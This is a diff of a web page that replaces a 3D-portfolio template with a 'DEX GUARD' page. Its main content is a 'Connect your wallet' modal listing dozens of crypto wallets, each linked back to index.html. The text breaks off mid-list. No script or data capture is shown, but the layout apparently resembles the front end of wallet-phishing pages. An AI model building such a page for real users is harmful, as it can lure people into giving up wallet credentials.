@@ -2,530 +2,1120 @@
 <html lang="en">
 
 <head>
-  <meta charset="utf-8">
-  <meta content="width=device-width, initial-scale=1.0" name="viewport">
 
-  <title>Holer3D - Project Sample </title>
-  <meta content="" name="description">
-  <meta content="" name="keywords">
+<meta charset="UTF-8">
 
-  <!-- Favicons -->
-  <link href="assets/img/favicon.png" rel="icon">
-  <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">
+<meta name="viewport"
+      content="width=device-width,
+               initial-scale=1.0,
+               maximum-scale=1.0">
 
-  <!-- Google Fonts -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,600;1,700&family=Montserrat:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&family=Raleway:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&display=swap" rel="stylesheet">
+<title>DEX GUARD</title>
 
-  <!-- Vendor CSS Files -->
-  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
-  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
-  <link href="assets/vendor/aos/aos.css" rel="stylesheet">
-  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
-  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
 
-  <!-- Template Main CSS File -->
-  <link href="assets/css/main.css" rel="stylesheet">
+<style>
 
-  <!-- =======================================================
-  * Template Name: Impact - v1.1.0
-  * Template URL: https://bootstrapmade.com/impact-bootstrap-business-website-template/
-  * Author: BootstrapMade.com
-  * License: https://bootstrapmade.com/license/
-  ======================================================== -->
+/* =====================================================
+   RESET
+===================================================== */
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+
+html {
+    scroll-behavior: smooth;
+}
+
+
+body {
+
+    width: 100%;
+
+    min-height: 100vh;
+
+    overflow-x: hidden;
+
+    font-family:
+        Arial,
+        Helvetica,
+        sans-serif;
+
+    color: white;
+
+    background: #080909;
+}
+
+
+/* =====================================================
+   COLORS
+===================================================== */
+
+:root {
+
+    --blue: #64ddff;
+
+    --blue-light: #a5efff;
+
+    --blue-dark: #18bfe7;
+
+    --background: #090a0b;
+
+    --card: #111213;
+
+    --text-gray: #888d90;
+
+}
+
+
+/* =====================================================
+   DARK BACKGROUND IMAGE
+===================================================== */
+
+body::before {
+
+    content: "";
+
+    position: fixed;
+
+    inset: 0;
+
+    z-index: -5;
+
+    background:
+
+        linear-gradient(
+            rgba(3, 5, 6, 0.92),
+            rgba(3, 5, 6, 0.96)
+        ),
+
+        url("graph-image.jpg");
+
+    background-size: cover;
+
+    background-position: center;
+
+    background-repeat: no-repeat;
+
+    filter: brightness(0.42);
+
+}
+
+
+/* =====================================================
+   HEADER
+===================================================== */
+
+.header {
+
+    width: 100%;
+
+    height: 52px;
+
+    display: flex;
+
+    align-items: center;
+
+    padding-left: 14px;
+
+    background:
+        rgba(4, 5, 6, 0.96);
+
+    border-bottom:
+        1px solid
+        rgba(255,255,255,0.04);
+
+}
+
+
+.logo {
+
+    width:170px;
+
+    height: auto;
+
+    display: block;
+}
+
+
+/* =====================================================
+   WALLET SECTION & MODAL STYLES
+===================================================== */
+
+.wallet-section {
+    width: 100%;
+    min-height: calc(100vh - 52px - 350px);
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    padding: 30px 15px 50px;
+}
+
+.wallet-modal {
+    width: 100%;
+    max-width: 480px;
+    background: #151719;
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    border-radius: 12px;
+    padding: 24px 20px;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+}
+
+.modal-title {
+    font-size: 18px;
+    font-weight: 700;
+    color: #ffffff;
+    margin-bottom: 20px;
+}
+
+/* Scrollable Container for Wallets */
+.wallet-list-container {
+    max-height: 250px; /* Limits height so only roughly 6 wallets show at a time */
+    overflow-y: auto;
+    padding-right: 6px;
+}
+
+/* Custom Scrollbar Styling */
+.wallet-list-container::-webkit-scrollbar {
+    width: 6px;
+}
+
+.wallet-list-container::-webkit-scrollbar-track {
+    background: rgba(255, 255, 255, 0.05);
+    border-radius: 3px;
+}
+
+.wallet-list-container::-webkit-scrollbar-thumb {
+    background: rgba(255, 255, 255, 0.2);
+    border-radius: 3px;
+}
+
+.wallet-list-container::-webkit-scrollbar-thumb:hover {
+    background: var(--blue);
+}
+
+.wallet-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 10px;
+}
+
+.wallet-item {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    background: #ffffff;
+    border-radius: 8px;
+    padding: 8px 10px;
+    text-decoration: none;
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+}
+
+.wallet-item:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 4px 12px rgba(100, 221, 255, 0.2);
+}
+
+.wallet-item-left {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    overflow: hidden;
+}
+
+.wallet-dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background-color: #ffd700;
+    flex-shrink: 0;
+}
+
+.wallet-name {
+    color: #000000;
+    font-size: 11px;
+    font-weight: 700;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+}
+
+.wallet-logo {
+    width: 20px;
+    height: 20px;
+    object-fit: contain;
+    flex-shrink: 0;
+    border-radius: 4px;
+}
+
+
+/* =====================================================
+   FOOTER
+===================================================== */
+
+.footer {
+
+    width: 100%;
+
+    background:
+        #1a1a1a;
+
+    padding:
+        43px 20px
+        35px;
+
+    border-top:
+        1px solid
+        rgba(255,255,255,0.03);
+}
+
+
+.footer-inner {
+
+    width: 100%;
+
+    max-width: 390px;
+
+    margin: auto;
+}
+
+
+/* =====================================================
+   FOOTER LOGO
+===================================================== */
+
+.footer-logo {
+
+    width: 150px;
+
+    height: auto;
+
+    display: block;
+
+    margin-bottom: 28px;
+}
+
+
+/* =====================================================
+   FOOTER DIVIDER
+===================================================== */
+
+.footer-divider {
+
+    width: 100%;
+
+    height: 1px;
+
+    background:
+        rgba(255,255,255,0.08);
+
+    margin-bottom: 30px;
+}
+
+
+/* =====================================================
+   PRIVACY TITLE
+===================================================== */
+
+.footer h2 {
+
+    color: #ffffff;
+
+    font-size: 16px;
+
+    font-weight: 400;
+
+    margin-bottom: 12px;
+}
+
+
+/* =====================================================
+   PRIVACY TEXT
+===================================================== */
+
+.footer p {
+
+    color: #85898b;
+
+    font-size: 11px;
+
+    line-height: 1.65;
+
+    margin-bottom: 17px;
+}
+
+
+/* =====================================================
+   THANK YOU
+===================================================== */
+
+.thank-you {
+
+    margin-top: 8px;
+
+    color: #9a9d9f !important;
+}
+
+
+/* =====================================================
+   COPYRIGHT
+===================================================== */
+
+.copyright {
+
+    margin-top: 55px;
+
+    margin-bottom: 0 !important;
+
+    color: #888b8d !important;
+
+    font-size: 10px !important;
+}
+
+
+.copyright span {
+
+    color:
+        var(--blue);
+}
+
+
+/* =====================================================
+   TABLET / DESKTOP
+===================================================== */
+
+@media (min-width: 700px) {
+
+    .footer-inner {
+
+        max-width: 1200px;
+    }
+
+}
+
+</style>
+
 </head>
+
 
 <body>
 
-  <!-- ======= Header ======= -->
-  <section id="topbar" class="topbar d-flex align-items-center">
-    <div class="container d-flex justify-content-center justify-content-md-between">
-      <div class="contact-info d-flex align-items-center">
-        <i class="bi bi-envelope d-flex align-items-center"><a href="mailto:contact@example.com">info@holer3d.com</a></i>
-        <i class="bi bi-phone d-flex align-items-center ms-4"><span>+12348165404860</span></i>
-      </div>
-      <div class="social-links d-none d-md-flex align-items-center">
-        <a href="#" class="twitter"><i class="bi bi-twitter"></i></a>
-        <a href="#" class="facebook"><i class="bi bi-facebook"></i></a>
-        <a href="#" class="instagram"><i class="bi bi-instagram"></i></a>
-        <a href="#" class="linkedin"><i class="bi bi-linkedin"></i></i></a>
-      </div>
-    </div>
-  </section><!-- End Top Bar -->
 
-  <header id="header" class="header d-flex align-items-center">
+<header class="header">
 
-    <div class="container-fluid container-xl d-flex align-items-center justify-content-between">
-      <a href="index.html" class="logo d-flex align-items-center">
-        <!-- Uncomment the line below if you also wish to use an image logo -->
-        <!-- <img src="assets/img/logo.png" alt=""> -->
-        <h1>Elevate Your Brand<span>.</span></h1>
-      </a>
-      <nav id="navbar" class="navbar">
-        <ul>
-          <li><a href="#hero">Home</a></li>
-          <li><a href="#services">Services</a></li>
-          <li><a href="#portfolio">Portfolio</a></li>
-          <li><a href="#team">Team</a></li>
-          <li><a href="#contact">Contact</a></li>
-        </ul>
-      </nav><!-- .navbar -->
+    <a href="index.html">
 
-      <i class="mobile-nav-toggle mobile-nav-show bi bi-list"></i>
-      <i class="mobile-nav-toggle mobile-nav-hide d-none bi bi-x"></i>
+        <img
+            src="1787770720214.png"
+            alt="DEX GUARD"
+            class="logo"
+        >
 
-    </div>
-  </header><!-- End Header -->
-  <!-- End Header -->
+    </a>
 
-  <!-- ======= Hero Section ======= -->
-  <section id="hero" class="hero">
-    <div class="container position-relative">
-      <div class="row gy-5" data-aos="fade-in">
-        <div class="col-lg-6 order-2 order-lg-1 d-flex flex-column justify-content-center text-center text-lg-start">
-          <h2>Welcome to <span>Our Portfolio</span></h2>
-          <p>This is one of the amazing samples we have for your productS. Click on one of the product below and watch the magic happens</p>
-          <div class="d-flex justify-content-center justify-content-lg-start">
-            <a href="#about" class="btn-get-started">Get Started</a>
-          </div>
-        </div>
-        <div class="col-lg-6 order-1 order-lg-2">
-          <img src="assets/img/hero-img.svg" class="img-fluid" alt="" data-aos="zoom-out" data-aos-delay="100">
-        </div>
-      </div>
-    </div>
-
-    </div>
-  </section>
-  <!-- End Hero Section -->
-
-  <main id="main">
-
-    <!-- ======= Portfolio Section ======= -->
-    <section id="portfolio" class="portfolio sections-bg">
-      <div class="container" data-aos="fade-up">
-
-        <div class="section-header">
-          <h2>Your Products</h2>
-          <p>Immersive Experience, Powered by HOLLER. Explore our Portfolio below and witness the magic of interactive 3D storytelling</p>
-        </div>
-
-        <div class="portfolio-isotope" data-portfolio-filter="*" data-portfolio-layout="masonry" data-portfolio-sort="original-order" data-aos="fade-up" data-aos-delay="100">
-
-          <div>
-            <ul class="portfolio-flters">
-              <li data-filter="*" class="filter-active">All</li>
-              <li data-filter=".filter-app">App</li>
-              <li data-filter=".filter-product">Product</li>
-              <li data-filter=".filter-branding">Branding</li>
-              <li data-filter=".filter-books">Books</li>
-            </ul><!-- End Portfolio Filters -->
-          </div>
-
-          <div class="row gy-4 portfolio-container">
-
-            <div class="col-xl-4 col-md-6 portfolio-item filter-app">
-              <div class="portfolio-wrap">
-                <a href="The Atrium Vista detail.html"><img src="assets/img/portfolio/real estate1.png" class="img-fluid" alt=""></a>
-                <div class="portfolio-info">
-                  <h4><a href="The Atrium Vista detail.html" title="More Details">The Atrium Vista</a></h4>
-                  <p>Luxury living in the heart of city</p>
-                </div>
-              </div>
-            </div><!-- End Portfolio Item -->
-
-            <div class="col-xl-4 col-md-6 portfolio-item filter-app">
-              <div class="portfolio-wrap">
-                <a href="The Crystal Pavilion detail.html"><img src="assets/img/portfolio/real estate2.png" class="img-fluid" alt=""></a>
-                <div class="portfolio-info">
-                  <h4><a href="The Crystal Pavilion detail.html" title="More Details">The Crystal Pavilion</a></h4>
-                  <p>Your dream space starts with this view</p>
-                </div>
-              </div>
-            </div><!-- End Portfolio Item -->
-
-            <div class="col-xl-4 col-md-6 portfolio-item filter-app">
-              <div class="portfolio-wrap">
-                <a href="Modwood Escape details.html"><img src="assets/img/portfolio/real estate3.png" class="img-fluid" alt=""></a>
-                <div class="portfolio-info">
-                  <h4><a href="Modwood Escape details.html" title="More Details">Modwood Escape</a></h4>
-                  <p>Invest smart, live grand in this beauty</p>
-                </div>
-              </div>
-            </div><!-- End Portfolio Item -->
+</header>
 
 
-            <div class="col-xl-4 col-md-6 portfolio-item filter-app">
-              <div class="portfolio-wrap">
-                <a href="shoe details.html"><img src="assets/img/portfolio/shoe.jpg" class="img-fluid" alt=""></a>
-                <div class="portfolio-info">
-                  <h4><a href="shoe details.html" title="More Details">Fashion</a></h4>
-                  <p>Classic leather built for modern ambition</p>
-                </div>
-              </div>
-            </div><!-- End Portfolio Item -->
+<section class="wallet-section">
 
-            <div class="col-xl-4 col-md-6 portfolio-item filter-product">
-              <div class="portfolio-wrap">
-                <a href="arm_chair detail.html"><img src="assets/img/portfolio/newchair.jpg" class="img-fluid" alt=""></a>
-                <div class="portfolio-info">
-                  <h4><a href="arm_chair detail.html" title="More Details">Furniture</a></h4>
-                  <p>Sit back, relax - luxury redefined today</p>
-                </div>
-              </div>
-            </div><!-- End Portfolio Item -->
-
-            <div class="col-xl-4 col-md-6 portfolio-item filter-app">
-              <div class="portfolio-wrap">
-                <a href="Wardrobe detail.html"><img src="assets/img/portfolio/modernrobe.jpg" class="img-fluid" alt=""></a>
-                <div class="portfolio-info">
-                  <h4><a href="Wardrobe detail.html" title="More Details">Furniture</a></h4>
-                  <p>Upgrade your space with wardrobe perfection</p>
-                </div>
-              </div>
-            </div><!-- End Portfolio Item -->
-
-            <div class="col-xl-4 col-md-6 portfolio-item filter-app">
-              <div class="portfolio-wrap">
-                <a href="extra_chocolate_marshmallow_cupcake detail.html"><img src="assets/img/portfolio/newicecream.jpg" class="img-fluid" alt=""></a>
-                <div class="portfolio-info">
-                  <h4><a href="extra_chocolate_marshmallow_cupcake detail.html" title="More Details">Snacks</a></h4>
-                  <p>Grab, munch, repeat - snacks done right</p>
-                </div>
-              </div>
-            </div><!-- End Portfolio Item -->
-
-            <div class="col-xl-4 col-md-6 portfolio-item filter-books">
-              <div class="portfolio-wrap">
-                <a href="vans shoe detail.html"><img src="assets/img/portfolio/sneaker.jpg" class="img-fluid" alt=""></a>
-                <div class="portfolio-info">
-                  <h4><a href="vans shoe detail.html" title="More Details">Sneaker</a></h4>
-                  <p>Move bold. walk loud. style never quits</p>
-                </div>
-              </div>
-            </div><!-- End Portfolio Item -->
-
-            <div class="col-xl-4 col-md-6 portfolio-item filter-product">
-              <div class="portfolio-wrap">
-                <a href="White_flower detail.html"><img src="assets/img/portfolio/whiteflower.jpg" class="img-fluid" alt=""></a>
-                <div class="portfolio-info">
-                  <h4><a href="White_flower detail.html" title="More Details">horticulture</a></h4>
-                  <p>Nurturing nature, one plant at a time</p>
-                </div>
-              </div>
-            </div><!-- End Portfolio Item -->
-
-            <div class="col-xl-4 col-md-6 portfolio-item filter-branding">
-              <div class="portfolio-wrap">
-                <a href="modern bed.html"><img src="assets/img/portfolio/modernbed.jpg" class="img-fluid" alt=""></a>
-                <div class="portfolio-info">
-                  <h4><a href="modern bed.html" title="More Details">Furniture</a></h4>
-                  <p>Designed for dream, built for modern living</p>
-                </div>
-              </div>
-            </div><!-- End Portfolio Item -->
-
-
-          </div><!-- End Portfolio Container -->
-
-        </div>
-
-      </div>
-    </section><!-- End Portfolio Section -->
-
-    <!-- ======= Our Services Section ======= -->
-    <section id="services" class="services sections-bg">
-      <div class="container" data-aos="fade-up">
-
-        <div class="section-header">
-          <h2>Our Services</h2>
-          <p>we specialize in creating high-performance webgl solutions that captivate audience and drive engagement, from 3D visualizations to interactive web applications, we bring your vision to life with precision and creativity</p>
-        </div>
-
-        <div class="row gy-4" data-aos="fade-up" data-aos-delay="100">
-
-          <div class="col-lg-4 col-md-6">
-            <div class="service-item  position-relative">
-              <div class="icon">
-                <i class="bi bi-activity"></i>
-              </div>
-              <h3>Interactive 3D web Experience</h3>
-              <p>Transform user engagement with stunning, broswer-based 3D no downloads, just mealess, immersive interactions that captive and concert</p>
-              <a href="#" class="readmore stretched-link">Read more <i class="bi bi-arrow-right"></i></a>
-            </div>
-          </div><!-- End Service Item -->
-
-          <div class="col-lg-4 col-md-6">
-            <div class="service-item position-relative">
-              <div class="icon">
-                <i class="bi bi-broadcast"></i>
-              </div>
-              <h3>high-performance visualizations</h3>
-              <p>Unlock lighting-fast, GPU Powered visuals for data, map, or simulations-smooth, scalable, and engineered for presision at 60fps.</p>
-              <a href="#" class="readmore stretched-link">Read more <i class="bi bi-arrow-right"></i></a>
-            </div>
-          </div><!-- End Service Item -->
-
+    <div class="wallet-modal">
+        <h2 class="modal-title">Connect your wallet</h2>
         
+        <div class="wallet-list-container">
+            <div class="wallet-grid">
 
-          <div class="col-lg-4 col-md-6">
-            <div class="service-item position-relative">
-              <div class="icon">
-                <i class="bi bi-chat-square-text"></i>
-              </div>
-              <h3>Shader and custom effects</h3>
-              <p>Elevate your brand with dynamic GLSL magic bespoke animations, particles, and effects that make your site a visual masterpiece..</p>
-              <a href="#" class="readmore stretched-link">Read more <i class="bi bi-arrow-right"></i></a>
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Metamask</span>
+                    </div>
+                    <img src="https://raw.githubusercontent.com/walletconnect/walletconnect-assets/master/Icon/PNG/metamask.png" alt="Metamask" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Trust</span>
+                    </div>
+                    <img src="https://raw.githubusercontent.com/walletconnect/walletconnect-assets/master/Icon/PNG/trust-wallet.png" alt="Trust" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Coinbase</span>
+                    </div>
+                    <img src="https://raw.githubusercontent.com/walletconnect/walletconnect-assets/master/Icon/PNG/coinbase.png" alt="Coinbase" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Kukai</span>
+                    </div>
+                    <img src="https://kukai.app/assets/img/kukai-logo.svg" alt="Kukai" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Cardano</span>
+                    </div>
+                    <img src="https://cryptologos.cc/logos/cardano-ada-logo.png" alt="Cardano" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Dero Wallet</span>
+                    </div>
+                    <img src="https://cryptologos.cc/logos/dero-dero-logo.png" alt="Dero Wallet" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Yoroi</span>
+                    </div>
+                    <img src="https://yoroi-wallet.com/assets/yoroi-logo-icon.svg" alt="Yoroi" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">CCVault</span>
+                    </div>
+                    <img src="https://eternl.io/app/icon-192.png" alt="CCVault" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Gero</span>
+                    </div>
+                    <img src="https://gerowallet.io/images/logo.png" alt="Gero" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Nami</span>
+                    </div>
+                    <img src="https://namiwallet.io/favicon.ico" alt="Nami" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Solana</span>
+                    </div>
+                    <img src="https://cryptologos.cc/logos/solana-sol-logo.png" alt="Solana" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Phantom</span>
+                    </div>
+                    <img src="https://phantom.app/img/phantom-logo.png" alt="Phantom" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Solflare</span>
+                    </div>
+                    <img src="https://solflare.com/assets/logo-icon.svg" alt="Solflare" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Sollet</span>
+                    </div>
+                    <img src="https://www.sollet.io/favicon.ico" alt="Sollet" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Solong</span>
+                    </div>
+                    <img src="https://solongwallet.com/favicon.ico" alt="Solong" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Exodus</span>
+                    </div>
+                    <img src="https://www.exodus.com/brand/img/exodus-symbol.svg" alt="Exodus" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Avalanche</span>
+                    </div>
+                    <img src="https://cryptologos.cc/logos/avalanche-avax-logo.png" alt="Avalanche" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Velas</span>
+                    </div>
+                    <img src="https://cryptologos.cc/logos/velas-vlx-logo.png" alt="Velas" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">crypto.com</span>
+                    </div>
+                    <img src="https://cryptologos.cc/logos/crypto-com-coin-cro-logo.png" alt="crypto.com" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Blockchain</span>
+                    </div>
+                    <img src="https://www.blockchain.com/static/img/favicon.ico" alt="Blockchain" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Binance Smart</span>
+                    </div>
+                    <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png" alt="Binance Smart" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Safepal</span>
+                    </div>
+                    <img src="https://safepal.com/favicon.ico" alt="Safepal" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Raydium</span>
+                    </div>
+                    <img src="https://raydium.io/favicon.ico" alt="Raydium" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Torus</span>
+                    </div>
+                    <img src="https://tor.us/images/torus-icon.svg" alt="Torus" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">MathWallet</span>
+                    </div>
+                    <img src="https://mathwallet.org/favicon.ico" alt="MathWallet" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Keyring Pro</span>
+                    </div>
+                    <img src="https://keyring.app/favicon.ico" alt="Keyring Pro" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">BitKeep</span>
+                    </div>
+                    <img src="https://bitkeep.com/favicon.ico" alt="BitKeep" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">SparkPoint</span>
+                    </div>
+                    <img src="https://sparkpoint.io/favicon.ico" alt="SparkPoint" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">OwnBit</span>
+                    </div>
+                    <img src="https://ownbit.io/favicon.ico" alt="OwnBit" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Infinity Wallet</span>
+                    </div>
+                    <img src="https://infinitywallet.io/favicon.ico" alt="Infinity Wallet" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">WalletConnect</span>
+                    </div>
+                    <img src="https://raw.githubusercontent.com/walletconnect/walletconnect-assets/master/Icon/PNG/walletconnect-logo.png" alt="WalletConnect" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Infinity</span>
+                    </div>
+                    <img src="https://infinitywallet.io/favicon.ico" alt="Infinity" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">TokenPocket</span>
+                    </div>
+                    <img src="https://tokenpocket.pro/favicon.ico" alt="TokenPocket" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Nash</span>
+                    </div>
+                    <img src="https://nash.io/favicon.ico" alt="Nash" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">BitPay</span>
+                    </div>
+                    <img src="https://bitpay.com/favicon.ico" alt="BitPay" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">imToken</span>
+                    </div>
+                    <img src="https://token.im/favicon.ico" alt="imToken" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Peritas</span>
+                    </div>
+                    <img src="https://peritas.io/favicon.ico" alt="Peritas" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">ParaSwap</span>
+                    </div>
+                    <img src="https://paraswap.io/favicon.ico" alt="ParaSwap" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Bity</span>
+                    </div>
+                    <img src="https://bity.com/favicon.ico" alt="Bity" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Defiat</span>
+                    </div>
+                    <img src="https://defiat.net/favicon.ico" alt="Defiat" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Crossmint</span>
+                    </div>
+                    <img src="https://crossmint.com/favicon.ico" alt="Crossmint" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Zelcore</span>
+                    </div>
+                    <img src="https://zelcore.io/favicon.ico" alt="Zelcore" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Freespace</span>
+                    </div>
+                    <img src="https://freespace.io/favicon.ico" alt="Freespace" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">OneKey</span>
+                    </div>
+                    <img src="https://onekey.so/favicon.ico" alt="OneKey" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Ledge</span>
+                    </div>
+                    <img src="https://www.ledger.com/favicon.ico" alt="Ledge" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Tezos</span>
+                    </div>
+                    <img src="https://cryptologos.cc/logos/tezos-xtz-logo.png" alt="Tezos" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
+                        <span class="wallet-dot"></span>
+                        <span class="wallet-name">Neobeats</span>
+                    </div>
+                    <img src="https://neobeats.io/favicon.ico" alt="Neobeats" class="wallet-logo">
+                </a>
+
+                <a href="index.html" class="wallet-item">
+                    <div class="wallet-item-left">
